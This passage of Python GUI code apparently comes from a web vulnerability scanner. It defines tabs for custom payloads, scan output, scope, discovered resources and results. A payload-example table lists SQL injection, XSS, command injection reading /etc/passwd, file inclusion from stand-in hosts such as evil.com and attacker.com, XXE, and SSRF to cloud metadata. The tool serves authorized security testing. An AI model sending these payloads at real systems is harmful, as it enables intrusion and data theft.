        self.custom_payloads_text.setMinimumHeight(300)
        self.custom_payloads_text.setStyleSheet("""
            QTextEdit {
                background-color: #0a0a0a;
                color: #00ff00;
                font-family: 'Consolas', 'Courier New', monospace;
                font-size: 11px;
                border: 2px solid #3a3a3a;
                border-radius: 4px;
                padding: 8px;
            }
        """)
        direct_layout.addWidget(self.custom_payloads_text)

        # Payload count
        self.payload_count_label = QLabel("Payloads: 0")
        self.payload_count_label.setStyleSheet("color: #00ff88; font-weight: bold;")
        direct_layout.addWidget(self.payload_count_label)

        # Update count when text changes
        self.custom_payloads_text.textChanged.connect(self.update_payload_count)

        # Action buttons
        button_layout = QHBoxLayout()

        clear_btn = QPushButton("🗑️ Clear All")
        clear_btn.setStyleSheet("""
            QPushButton {
                background-color: #ff4444;
                color: white;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #cc0000;
            }
        """)
        clear_btn.clicked.connect(lambda: self.custom_payloads_text.clear())
        button_layout.addWidget(clear_btn)

        save_btn = QPushButton("💾 Save to File")
        save_btn.setStyleSheet("""
            QPushButton {
                background-color: #00ff88;
                color: black;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00cc70;
            }
        """)
        save_btn.clicked.connect(self.save_payloads_to_file)
        button_layout.addWidget(save_btn)

        button_layout.addStretch()
        direct_layout.addLayout(button_layout)

        direct_group.setLayout(direct_layout)
        layout.addWidget(direct_group)

        # Initialize with default examples
        self.update_payload_examples("All Modules")

        layout.addStretch()
        return widget

    def create_output_tab(self):
        """Create output tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 2px solid #3a3a3a;
                border-radius: 5px;
                text-align: center;
                background-color: #1a1a1a;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #00ff88, stop:1 #00cc70);
            }
        """)
        layout.addWidget(self.progress_bar)

        # Current module label
        self.current_module_label = QLabel("Ready to start scan...")
        self.current_module_label.setStyleSheet("color: #00ff88; font-size: 14px; font-weight: bold;")
        layout.addWidget(self.current_module_label)

        # Output console
        self.output_console = QTextEdit()
        self.output_console.setReadOnly(True)
        self.output_console.setFont(QFont("Consolas", 10))
        self.output_console.setStyleSheet("""
            QTextEdit {
                background-color: #0a0a0a;
                color: #00ff00;
                border: 2px solid #3a3a3a;
                border-radius: 5px;
                padding: 10px;
            }
        """)
        layout.addWidget(self.output_console)

        # Clear button
        clear_btn = QPushButton("Clear Output")
        clear_btn.clicked.connect(self.output_console.clear)
        layout.addWidget(clear_btn)

        return widget

    def create_scope_tab(self):
        """Create scope tab with technology detection, IP info, titles, description"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Project Description
        desc_group = QGroupBox("📝 Project Information")
        desc_layout = QVBoxLayout()

        desc_label = QLabel("Project/Scan Description:")
        desc_label.setStyleSheet("color: #00ff88; font-weight: bold;")
        desc_layout.addWidget(desc_label)

        self.project_description = QTextEdit()
        self.project_description.setPlaceholderText(
            "Enter project details, scope notes, or testing objectives...\n\n"
            "Example:\n"
            "- Client: Acme Corp\n"
            "- Scope: Web application penetration test\n"
            "- Authorized by: John Doe (john@acme.com)\n"
            "- Testing window: Nov 14-18, 2025\n"
            "- Special notes: Avoid production database"
        )
        self.project_description.setMaximumHeight(120)
        self.project_description.setStyleSheet("""
            QTextEdit {
                background-color: #2a2a2a;
                color: white;
                border: 2px solid #3a3a3a;
                border-radius: 4px;
                padding: 8px;
                font-family: 'Consolas', 'Courier New', monospace;
            }
        """)
        desc_layout.addWidget(self.project_description)

        desc_group.setLayout(desc_layout)
        layout.addWidget(desc_group)

        # Scope Management
        scope_group = QGroupBox("🎯 Scan Scope")
        scope_layout = QVBoxLayout()

        scope_info = QLabel("Targets in scope will be scanned. Out-of-scope URLs will be ignored during crawling.")
        scope_info.setStyleSheet("color: #888888; font-size: 10px;")
        scope_info.setWordWrap(True)
        scope_layout.addWidget(scope_info)

        self.scope_table = QTableWidget()
        self.scope_table.setColumnCount(4)
        self.scope_table.setHorizontalHeaderLabels(["URL/Domain", "Status", "Title", "Technologies"])
        self.scope_table.horizontalHeader().setStretchLastSection(True)
        self.scope_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.scope_table.setStyleSheet("""
            QTableWidget {
                background-color: #1a1a1a;
                color: white;
                gridline-color: #3a3a3a;
                border: 2px solid #3a3a3a;
                border-radius: 5px;
            }
            QHeaderView::section {
                background-color: #2a2a2a;
                color: #00ff88;
                padding: 8px;
                border: 1px solid #3a3a3a;
                font-weight: bold;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:selected {
                background-color: #00ff88;
                color: black;
            }
        """)
        scope_layout.addWidget(self.scope_table)

        scope_group.setLayout(scope_layout)
        layout.addWidget(scope_group)

        # Technology Detection
        tech_group = QGroupBox("🔧 Detected Technologies")
        tech_layout = QVBoxLayout()

        self.tech_table = QTableWidget()
        self.tech_table.setColumnCount(4)
        self.tech_table.setHorizontalHeaderLabels(["Technology", "Version", "Category", "Found On"])
        self.tech_table.horizontalHeader().setStretchLastSection(True)
        self.tech_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.tech_table.setStyleSheet("""
            QTableWidget {
                background-color: #1a1a1a;
                color: white;
                gridline-color: #3a3a3a;
                border: 2px solid #3a3a3a;
                border-radius: 5px;
            }
            QHeaderView::section {
                background-color: #2a2a2a;
                color: #00ff88;
                padding: 8px;
                border: 1px solid #3a3a3a;
                font-weight: bold;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:selected {
                background-color: #00ff88;
                color: black;
            }
        """)
        tech_layout.addWidget(self.tech_table)

        tech_group.setLayout(tech_layout)
        layout.addWidget(tech_group)

        # IP Geolocation
        geo_group = QGroupBox("🌍 IP Geolocation")
        geo_layout = QVBoxLayout()

        self.geo_table = QTableWidget()
        self.geo_table.setColumnCount(5)
        self.geo_table.setHorizontalHeaderLabels(["IP Address", "Country", "City", "ISP", "Domain"])
        self.geo_table.horizontalHeader().setStretchLastSection(True)
        self.geo_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.geo_table.setStyleSheet("""
            QTableWidget {
                background-color: #1a1a1a;
                color: white;
                gridline-color: #3a3a3a;
                border: 2px solid #3a3a3a;
                border-radius: 5px;
            }
            QHeaderView::section {
                background-color: #2a2a2a;
                color: #00ff88;
                padding: 8px;
                border: 1px solid #3a3a3a;
                font-weight: bold;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:selected {
                background-color: #00ff88;
                color: black;
            }
        """)
        geo_layout.addWidget(self.geo_table)

        geo_group.setLayout(geo_layout)
        layout.addWidget(geo_group)

        return widget

    def create_resources_tab(self):
        """Create resources tab with social media, emails, phones, leaked keys"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Resources summary header
        summary_label = QLabel("📦 Discovered Resources")
        summary_label.setFont(QFont("Arial", 14, QFont.Bold))
        summary_label.setStyleSheet("color: #00ff88; padding: 10px;")
        layout.addWidget(summary_label)

        # Social Media section
        social_group = QGroupBox("🌐 Social Media Links")
        social_layout = QVBoxLayout()

        self.social_media_table = QTableWidget()
        self.social_media_table.setColumnCount(3)
        self.social_media_table.setHorizontalHeaderLabels(["Platform", "URL", "Found On"])
        self.social_media_table.horizontalHeader().setStretchLastSection(True)
        self.social_media_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.social_media_table.setStyleSheet("""
            QTableWidget {
                background-color: #1a1a1a;
                color: white;
                gridline-color: #3a3a3a;
                border: 2px solid #3a3a3a;
                border-radius: 5px;
            }
            QHeaderView::section {
                background-color: #2a2a2a;
                color: #00ff88;
                padding: 8px;
                border: 1px solid #3a3a3a;
                font-weight: bold;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:selected {
                background-color: #00ff88;
                color: black;
            }
        """)
        social_layout.addWidget(self.social_media_table)
        social_group.setLayout(social_layout)
        layout.addWidget(social_group)

        # Emails section
        emails_group = QGroupBox("📧 Email Addresses")
        emails_layout = QVBoxLayout()

        self.emails_table = QTableWidget()
        self.emails_table.setColumnCount(3)
        self.emails_table.setHorizontalHeaderLabels(["Email", "Type", "Found On"])
        self.emails_table.horizontalHeader().setStretchLastSection(True)
        self.emails_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.emails_table.setStyleSheet("""
            QTableWidget {
                background-color: #1a1a1a;
                color: white;
                gridline-color: #3a3a3a;
                border: 2px solid #3a3a3a;
                border-radius: 5px;
            }
            QHeaderView::section {
                background-color: #2a2a2a;
                color: #00ff88;
                padding: 8px;
                border: 1px solid #3a3a3a;
                font-weight: bold;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:selected {
                background-color: #00ff88;
                color: black;
            }
        """)
        emails_layout.addWidget(self.emails_table)
        emails_group.setLayout(emails_layout)
        layout.addWidget(emails_group)

        # Phone Numbers section
        phones_group = QGroupBox("📱 Phone Numbers")
        phones_layout = QVBoxLayout()

        self.phones_table = QTableWidget()
        self.phones_table.setColumnCount(3)
        self.phones_table.setHorizontalHeaderLabels(["Phone Number", "Format", "Found On"])
        self.phones_table.horizontalHeader().setStretchLastSection(True)
        self.phones_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.phones_table.setStyleSheet("""
            QTableWidget {
                background-color: #1a1a1a;
                color: white;
                gridline-color: #3a3a3a;
                border: 2px solid #3a3a3a;
                border-radius: 5px;
            }
            QHeaderView::section {
                background-color: #2a2a2a;
                color: #00ff88;
                padding: 8px;
                border: 1px solid #3a3a3a;
                font-weight: bold;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:selected {
                background-color: #00ff88;
                color: black;
            }
        """)
        phones_layout.addWidget(self.phones_table)
        phones_group.setLayout(phones_layout)
        layout.addWidget(phones_group)

        # Leaked Keys section
        keys_group = QGroupBox("🔑 Leaked API Keys & Secrets")
        keys_layout = QVBoxLayout()

        self.leaked_keys_table = QTableWidget()
        self.leaked_keys_table.setColumnCount(4)
        self.leaked_keys_table.setHorizontalHeaderLabels(["Key Type", "Key Preview", "Severity", "Found On"])
        self.leaked_keys_table.horizontalHeader().setStretchLastSection(True)
        self.leaked_keys_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.leaked_keys_table.setStyleSheet("""
            QTableWidget {
                background-color: #1a1a1a;
                color: white;
                gridline-color: #3a3a3a;
                border: 2px solid #3a3a3a;
                border-radius: 5px;
            }
            QHeaderView::section {
                background-color: #2a2a2a;
                color: #00ff88;
                padding: 8px;
                border: 1px solid #3a3a3a;
                font-weight: bold;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:selected {
                background-color: #00ff88;
                color: black;
            }
        """)
        keys_layout.addWidget(self.leaked_keys_table)
        keys_group.setLayout(keys_layout)
        layout.addWidget(keys_group)

        # Export button
        export_btn = QPushButton("📤 Export Resources to File")
        export_btn.setStyleSheet("""
            QPushButton {
                background-color: #00ff88;
                color: black;
                padding: 10px;
                border-radius: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00cc70;
            }
        """)
        export_btn.clicked.connect(self.export_resources)
        layout.addWidget(export_btn)

        return widget

    def create_results_tab(self):
        """Create results tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Results summary
        summary_group = QGroupBox("📊 Scan Summary")
        summary_layout = QGridLayout()

        self.total_vulns_label = QLabel("Total Vulnerabilities: 0")
        self.total_vulns_label.setStyleSheet("color: #ff4444; font-size: 14px; font-weight: bold;")
        summary_layout.addWidget(self.total_vulns_label, 0, 0)

        self.critical_label = QLabel("Critical: 0")
        self.critical_label.setStyleSheet("color: #ff0000; font-size: 13px;")
        summary_layout.addWidget(self.critical_label, 0, 1)

        self.high_label = QLabel("High: 0")
        self.high_label.setStyleSheet("color: #ff8800; font-size: 13px;")
        summary_layout.addWidget(self.high_label, 0, 2)

        self.medium_label = QLabel("Medium: 0")
        self.medium_label.setStyleSheet("color: #ffff00; font-size: 13px;")
        summary_layout.addWidget(self.medium_label, 0, 3)

        summary_group.setLayout(summary_layout)
        layout.addWidget(summary_group)

        # Vulnerability list
        vulns_group = QGroupBox("🔍 Found Vulnerabilities")
        vulns_layout = QVBoxLayout()

        self.vulns_list = QListWidget()
        self.vulns_list.setStyleSheet("""
            QListWidget {
                background-color: #1a1a1a;
                border: 2px solid #3a3a3a;
                border-radius: 5px;
            }
            QListWidget::item {
                padding: 8px;
                border-bottom: 1px solid #2a2a2a;
            }
            QListWidget::item:hover {
                background-color: #2a2a2a;
            }
        """)
        vulns_layout.addWidget(self.vulns_list)

        vulns_group.setLayout(vulns_layout)
        layout.addWidget(vulns_group)

        # Open report button
        open_report_btn = QPushButton("📄 Open HTML Report")
        open_report_btn.clicked.connect(self.open_report)
        layout.addWidget(open_report_btn)

        return widget

    def toggle_module_selection(self, checked):
        """Toggle individual module selection"""
        for cb in self.module_checkboxes.values():
            cb.setEnabled(not checked)
            if checked:
                cb.setChecked(False)

    def browse_target_file(self):
        """Browse for target file"""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Select Target File", "", "Text Files (*.txt);;All Files (*)"
        )
        if filename:
            self.target_file_input.setText(filename)

    def browse_payloads_file(self):
        """Browse for custom payloads file"""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Select Payloads File", "", "Text Files (*.txt);;All Files (*)"
        )
        if filename:
            self.custom_payloads_file.setText(filename)
            # Auto-load the file content into the text editor
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    content = f.read()
                    self.custom_payloads_text.setPlainText(content)
            except Exception as e:
                self.output_console.append(f"[!] Error loading payloads file: {e}")

    def update_payload_count(self):
        """Update the payload count label"""
        text = self.custom_payloads_text.toPlainText()
        lines = [line.strip() for line in text.split('\n') if line.strip()]
        count = len(lines)
        self.payload_count_label.setText(f"Payloads: {count}")

    def update_payload_examples(self, module_text):
        """Update payload examples based on selected module"""
        examples = {
            "All Modules": "ℹ️ Payloads will be applied to ALL compatible modules. Use specific module selection for better control.",
            "SQL Injection (sqli)": "💡 SQL Injection Examples:\n' OR 1=1--\nadmin' --\n1' UNION SELECT NULL,NULL,NULL--\n' AND '1'='1\n1 OR 1=1",
            "Cross-Site Scripting (xss)": "💡 XSS Examples:\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n'\"><script>alert(document.domain)</script>\n<svg onload=alert(1)>\n<body onload=alert(1)>",
            "Server-Side Template Injection (ssti)": "💡 SSTI Examples:\n{{7*7}}\n${7*7}\n{{config}}\n{{config.items()}}\n{{''.class.mro()[1].subclasses()}}",
            "Command Injection (cmdi)": "💡 Command Injection Examples:\n;whoami\n`whoami`\n$(whoami)\n| whoami\n& whoami\n;cat /etc/passwd",
            "LDAP Injection (ldap)": "💡 LDAP Injection Examples:\n*)(uid=*))(|(uid=*\nadmin*\n*)(|(password=*\n)(cn=*))(|(cn=*",
            "XPath Injection (xpath)": "💡 XPath Injection Examples:\n' or '1'='1\n' or 1=1 or ''='\n//*\nx' or name()='username' or 'x'='y",
            "Local File Inclusion (lfi)": "💡 LFI Examples:\n../../../etc/passwd\n....//....//....//etc/passwd\n/etc/passwd\nphp://filter/convert.base64-encode/resource=index.php",
            "Remote File Inclusion (rfi)": "💡 RFI Examples:\nhttp://evil.com/shell.txt\nhttps://attacker.com/backdoor.php\nftp://malicious.com/payload.txt",
            "XML External Entity (xxe)": "💡 XXE Examples:\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">\n<!ENTITY % xxe SYSTEM \"file:///etc/hostname\">",
            "Server-Side Request Forgery (ssrf)": "💡 SSRF Examples:\nhttp://127.0.0.1\nhttp://localhost\nhttp://169.254.169.254/latest/meta-data/\nhttp://[::1]",
            "PHP Object Injection (php_object_injection)": "💡 PHP Object Injection Examples:\nO:8:\"stdClass\":0:{}\nO:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}\na:2:{i:0;s:4:\"test\";i:1;s:5:\"admin\";}"
        }

        example_text = examples.get(module_text, "Select a module to see specific payload examples.")
        self.payload_example_label.setText(example_text)

    def save_payloads_to_file(self):
        """Save custom payloads to a file"""
        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Payloads File", "custom_payloads.txt", "Text Files (*.txt);;All Files (*)"
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.custom_payloads_text.toPlainText())
                self.custom_payloads_file.setText(filename)
                QMessageBox.information(self, "Success", f"Payloads saved to:\n{filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save payloads:\n{e}")

    def on_auth_type_changed(self, auth_type):
        """Handle authentication type change"""
        # Disable all fields first
        self.auth_username.setEnabled(False)
        self.auth_password.setEnabled(False)
        self.auth_token.setEnabled(False)
        self.auth_header_name.setEnabled(False)

        # Enable fields based on auth type
        if auth_type in ["Basic Auth", "Digest Auth", "NTLM Auth"]:
            self.auth_username.setEnabled(True)
            self.auth_password.setEnabled(True)
        elif auth_type == "Bearer Token":
            self.auth_token.setEnabled(True)
        elif auth_type == "API Key":
            self.auth_token.setEnabled(True)
            self.auth_header_name.setEnabled(True)
            self.auth_header_name.setPlaceholderText("e.g., X-API-Key")
        elif auth_type == "OAuth 2.0":
            self.auth_token.setEnabled(True)
        elif auth_type == "Custom Header":
            self.auth_token.setEnabled(True)
            self.auth_header_name.setEnabled(True)
            self.auth_header_name.setPlaceholderText("e.g., X-Custom-Auth")

    def build_command(self):
        """Build the scanner command"""
        # Get parent directory (where main.py is)
        parent_dir = Path(__file__).parent.parent
        main_script = parent_dir / "main.py"

        command = [sys.executable, str(main_script)]

        # Target
        if self.target_file_input.text():
            command.extend(["-f", self.target_file_input.text()])
        elif self.target_input.toPlainText().strip():
            # Get all targets from text area (comma-separated or newline-separated)
            targets_text = self.target_input.toPlainText().strip()
            # Convert newlines to commas for multi-target support
            targets = targets_text.replace('\n', ',').replace('\r', '')
            command.extend(["-t", targets])
        else:
            return None

        # Modules
        if self.all_modules_cb.isChecked():
            command.append("--all")
        else:
            selected = [name for name, cb in self.module_checkboxes.items() if cb.isChecked()]
            if selected:
                command.extend(["-m", ",".join(selected)])

        # Settings
        command.extend(["--threads", str(self.threads_spin.value())])
        command.extend(["--timeout", str(self.timeout_spin.value())])
        command.extend(["--max-time", str(self.max_time_spin.value())])
        command.extend(["--format", self.format_combo.currentText()])
        command.append("--auto-report")
        command.append("-v")

        # ROTATION 9 flags
        if self.recon_only_cb.isChecked():
            command.append("--recon-only")
        if self.rotate_agent_cb.isChecked():
            command.append("--rotate-agent")
        if self.single_page_cb.isChecked():
            command.append("--single-page")

        # Authentication - add as custom headers
        auth_type = self.auth_type_combo.currentText()
        auth_headers = []

        if auth_type == "Basic Auth":
            if self.auth_username.text() and self.auth_password.text():
                import base64
                credentials = f"{self.auth_username.text()}:{self.auth_password.text()}"
                b64_credentials = base64.b64encode(credentials.encode()).decode()
                auth_headers.append(f"Authorization: Basic {b64_credentials}")

        elif auth_type == "Bearer Token":
            if self.auth_token.text():
                auth_headers.append(f"Authorization: Bearer {self.auth_token.text()}")

        elif auth_type == "API Key":
            if self.auth_token.text() and self.auth_header_name.text():
                auth_headers.append(f"{self.auth_header_name.text()}: {self.auth_token.text()}")

        elif auth_type == "OAuth 2.0":
            if self.auth_token.text():
                auth_headers.append(f"Authorization: Bearer {self.auth_token.text()}")

        elif auth_type == "Custom Header":
            if self.auth_token.text() and self.auth_header_name.text():
                auth_headers.append(f"{self.auth_header_name.text()}: {self.auth_token.text()}")

        # Add authentication headers to custom headers
        if auth_headers:
            existing_headers = self.headers_input.toPlainText()
            if existing_headers:
                all_headers = existing_headers + "\n" + "\n".join(auth_headers)
            else:
                all_headers = "\n".join(auth_headers)
            # Will be handled by custom headers processing below

        # HTTP config
        if self.cookies_input.text():
            command.extend(["-c", self.cookies_input.text()])

        # Custom headers (including auth headers)
        headers_text = self.headers_input.toPlainText()
        if auth_headers:
            if headers_text:
                headers_text += "\n" + "\n".join(auth_headers)
            else:
                headers_text = "\n".join(auth_headers)

        if headers_text.strip():
            # Convert headers to command format (Header:Value pairs)
            for line in headers_text.strip().split('\n'):
                if ':' in line:
                    command.extend(["-H", line.strip()])

        # Crawler
        command.extend(["--max-crawl-pages", str(self.max_crawl_spin.value())])

        # Custom payloads - will be set in start_scan if text payloads are provided
        # Otherwise use file path if specified
        if self.custom_payloads_file.text() and not self.custom_payloads_text.toPlainText().strip():
            command.extend(["--custom-payloads", self.custom_payloads_file.text()])

        return command

    def start_scan(self):
        """Start the vulnerability scan"""
        command = self.build_command()
        if not command:
            self.output_console.append("ERROR: Please specify a target URL or file")
            return

        # Handle custom payloads entered directly in text area
        payloads_text = self.custom_payloads_text.toPlainText().strip()
        temp_payload_file = None

        if payloads_text:
            # Create temporary file with custom payloads
            import tempfile
            try:
                temp_payload_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8')
                temp_payload_file.write(payloads_text)
                temp_payload_file.close()

                # Add to command
                command.extend(["--custom-payloads", temp_payload_file.name])
                self.output_console.append(f"[*] Using {len(payloads_text.split(chr(10)))} custom payloads from text editor\n")
            except Exception as e:
                self.output_console.append(f"[!] Error creating temporary payloads file: {e}\n")
                if temp_payload_file:
                    temp_payload_file.close()
                return

        # Update UI
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.output_console.clear()
        self.output_console.append(f"[*] Starting scan with command:\n{' '.join(command)}\n")
        self.statusBar().showMessage("Scan running...")
        self.progress_bar.setValue(0)
        self.current_module_label.setText("Initializing scan...")

        # Reset vulnerability counters and list
        self.vuln_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        self.update_vuln_display()
        self.vulns_list.clear()
        # Reset results tab color
        self.tabs.tabBar().setTabTextColor(4, QColor('white'))  # Results tab (index 4)

        # Clear resources tables
        self.social_media_table.setRowCount(0)
        self.emails_table.setRowCount(0)
        self.phones_table.setRowCount(0)
        self.leaked_keys_table.setRowCount(0)

        # Clear scope tables
        self.scope_table.setRowCount(0)
        self.tech_table.setRowCount(0)
        self.geo_table.setRowCount(0)

        # Start scan thread
        self.scan_thread = ScanThread(command)
        self.scan_thread.output_signal.connect(self.append_output)
        self.scan_thread.finished_signal.connect(self.scan_finished)
        self.scan_thread.progress_signal.connect(self.update_progress)
        self.scan_thread.vulnerability_signal.connect(self.add_vulnerability)
        self.scan_thread.stats_signal.connect(self.update_stats)
        self.scan_thread.resource_signal.connect(self.add_resource)
        self.scan_thread.scope_signal.connect(self.add_scope_info)
        self.scan_thread.start()

        # Switch to output tab to show progress
        self.tabs.setCurrentIndex(3)  # Switch to "Scan Output" tab (index 3 after adding Custom Payloads tab)

    def stop_scan(self):
        """Stop the running scan"""
        if self.scan_thread:
            self.scan_thread.stop()
            self.output_console.append("\n[!] Scan stopped by user")
            self.scan_finished(-1)

    def append_output(self, text):
        """Append text to output console"""
        self.output_console.append(text)
        # Auto-scroll to bottom
        self.output_console.moveCursor(QTextCursor.End)

    def update_progress(self, value, message):
        """Update progress bar and status"""
        if value > 0:
            self.progress_bar.setValue(value)
        self.current_module_label.setText(message)

    def scan_finished(self, return_code):
        """Handle scan completion"""
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)

        if return_code == 0:
            self.statusBar().showMessage("Scan completed successfully")
            self.output_console.append("\n[✓] Scan completed successfully!")
            self.progress_bar.setValue(100)
            self.current_module_label.setText("Scan complete!")
            # Switch to results tab
            self.tabs.setCurrentIndex(4)  # Results tab (index 4 after adding Custom Payloads tab)
        else:
            self.statusBar().showMessage("Scan failed or was stopped")
            self.output_console.append("\n[✗] Scan failed or was stopped")

    def add_vulnerability(self, severity, description):
        """Add vulnerability to the results list"""
        # Update counters
        if severity in self.vuln_counts:
            self.vuln_counts[severity] += 1

        # Update display
        self.update_vuln_display()

        # Add to list with color coding
        color = '#ff0000' if severity == 'CRITICAL' else '#ff8800' if severity == 'HIGH' else '#ffff00'
        item = QListWidgetItem(f"[{severity}] {description}")
        item.setForeground(QColor(color))
        self.vulns_list.addItem(item)

        # Flash results tab to show new finding
        self.tabs.tabBar().setTabTextColor(4, QColor('#ff0000'))  # Results tab (index 4)

    def update_stats(self, total_vulns, modules_done, modules_total):
        """Update scan statistics"""
        # Update status bar
        self.statusBar().showMessage(f"Scan running... | {modules_done}/{modules_total} modules | {total_vulns} vulnerabilities")

    def update_vuln_display(self):
        """Update vulnerability count displays"""
        total = sum(self.vuln_counts.values())
        self.total_vulns_label.setText(f"Total Vulnerabilities: {total}")
        self.critical_label.setText(f"Critical: {self.vuln_counts['CRITICAL']}")
        self.high_label.setText(f"High: {self.vuln_counts['HIGH']}")
        self.medium_label.setText(f"Medium: {self.vuln_counts['MEDIUM']}")

    def add_resource(self, resource_type, value, extra, source):
        """Add discovered resource to appropriate table"""
        if resource_type == "email":
            # Check if already exists
            for row in range(self.emails_table.rowCount()):
                if self.emails_table.item(row, 0) and self.emails_table.item(row, 0).text() == value:
                    return  # Already added

            row = self.emails_table.rowCount()
            self.emails_table.insertRow(row)
            self.emails_table.setItem(row, 0, QTableWidgetItem(value))
            self.emails_table.setItem(row, 1, QTableWidgetItem(extra))  # Type (Personal/Business)
            self.emails_table.setItem(row, 2, QTableWidgetItem(source))

        elif resource_type == "phone":
            # Check if already exists
            for row in range(self.phones_table.rowCount()):
                if self.phones_table.item(row, 0) and self.phones_table.item(row, 0).text() == value:
                    return

            row = self.phones_table.rowCount()
            self.phones_table.insertRow(row)
            self.phones_table.setItem(row, 0, QTableWidgetItem(value))
            self.phones_table.setItem(row, 1, QTableWidgetItem(extra))  # Format
            self.phones_table.setItem(row, 2, QTableWidgetItem(source))

        elif resource_type == "social":
            # Check if already exists
            for row in range(self.social_media_table.rowCount()):
                if self.social_media_table.item(row, 1) and self.social_media_table.item(row, 1).text() == value:
                    return

            row = self.social_media_table.rowCount()
            self.social_media_table.insertRow(row)
            self.social_media_table.setItem(row, 0, QTableWidgetItem(extra))  # Platform
            self.social_media_table.setItem(row, 1, QTableWidgetItem(value))  # URL
            self.social_media_table.setItem(row, 2, QTableWidgetItem(source))

        elif resource_type == "leaked_key":
            # Check if already exists
            for row in range(self.leaked_keys_table.rowCount()):
                if self.leaked_keys_table.item(row, 1) and self.leaked_keys_table.item(row, 1).text() == value:
                    return

            row = self.leaked_keys_table.rowCount()
            self.leaked_keys_table.insertRow(row)

            # Parse extra: "KeyType|Severity"
            parts = extra.split('|')
            key_type = parts[0] if len(parts) > 0 else "Unknown"
            severity = parts[1] if len(parts) > 1 else "HIGH"

            self.leaked_keys_table.setItem(row, 0, QTableWidgetItem(key_type))
            self.leaked_keys_table.setItem(row, 1, QTableWidgetItem(value))

            # Color-code severity
            severity_item = QTableWidgetItem(severity)
            if severity == "CRITICAL":
                severity_item.setForeground(QColor('#ff0000'))
            elif severity == "HIGH":
                severity_item.setForeground(QColor('#ff8800'))
            self.leaked_keys_table.setItem(row, 2, severity_item)

            self.leaked_keys_table.setItem(row, 3, QTableWidgetItem(source))

    def export_resources(self):
        """Export discovered resources to a file"""
        if (self.social_media_table.rowCount() == 0 and
            self.emails_table.rowCount() == 0 and
            self.phones_table.rowCount() == 0 and
            self.leaked_keys_table.rowCount() == 0):
            QMessageBox.information(self, "No Resources", "No resources to export!")
            return

        filename, _ = QFileDialog.getSaveFileName(
            self, "Export Resources", "resources_report.txt", "Text Files (*.txt);;CSV Files (*.csv);;All Files (*)"
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("="*80 + "\n")
                    f.write(" DOMINATOR - DISCOVERED RESOURCES REPORT\n")
                    f.write("="*80 + "\n\n")

                    # Social Media
                    if self.social_media_table.rowCount() > 0:
                        f.write(f"\n🌐 SOCIAL MEDIA LINKS ({self.social_media_table.rowCount()})\n")
                        f.write("-"*80 + "\n")
                        for row in range(self.social_media_table.rowCount()):
                            platform = self.social_media_table.item(row, 0).text()
                            url = self.social_media_table.item(row, 1).text()
                            source = self.social_media_table.item(row, 2).text()
                            f.write(f"  {platform:15s} | {url}\n")
                            f.write(f"  Found on: {source}\n\n")

                    # Emails
                    if self.emails_table.rowCount() > 0:
                        f.write(f"\n📧 EMAIL ADDRESSES ({self.emails_table.rowCount()})\n")
                        f.write("-"*80 + "\n")
                        for row in range(self.emails_table.rowCount()):
                            email = self.emails_table.item(row, 0).text()
                            email_type = self.emails_table.item(row, 1).text()
                            source = self.emails_table.item(row, 2).text()
                            f.write(f"  {email:30s} | Type: {email_type}\n")
                            f.write(f"  Found on: {source}\n\n")

                    # Phones
                    if self.phones_table.rowCount() > 0:
                        f.write(f"\n📱 PHONE NUMBERS ({self.phones_table.rowCount()})\n")
                        f.write("-"*80 + "\n")
                        for row in range(self.phones_table.rowCount()):
                            phone = self.phones_table.item(row, 0).text()
                            phone_format = self.phones_table.item(row, 1).text()
                            source = self.phones_table.item(row, 2).text()
                            f.write(f"  {phone:20s} | Format: {phone_format}\n")
                            f.write(f"  Found on: {source}\n\n")

                    # Leaked Keys
                    if self.leaked_keys_table.rowCount() > 0:
                        f.write(f"\n🔑 LEAKED API KEYS & SECRETS ({self.leaked_keys_table.rowCount()})\n")
                        f.write("-"*80 + "\n")
                        f.write("⚠️  WARNING: These keys should be rotated immediately!\n\n")
                        for row in range(self.leaked_keys_table.rowCount()):
                            key_type = self.leaked_keys_table.item(row, 0).text()
                            key_preview = self.leaked_keys_table.item(row, 1).text()
